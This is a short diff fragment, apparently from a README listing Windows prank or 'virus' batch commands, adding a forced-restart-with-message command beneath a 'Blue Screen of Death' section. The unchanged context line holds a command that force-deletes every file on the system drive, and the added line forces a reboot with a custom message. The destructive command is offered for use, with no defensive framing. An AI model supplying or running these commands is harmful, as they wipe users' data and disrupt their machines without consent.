@@ -114,6 +114,9 @@ v) Windows Blue Screen of Death
 delete %systemdrive%\*.\* /f /s
 
 
+**RESTART WITH A MESSAGE:**
+shutdown -r -f -t 60 -c "MESSAGE HERE"
+
 FOR MORE INFO, Contact Developer :-
 
 
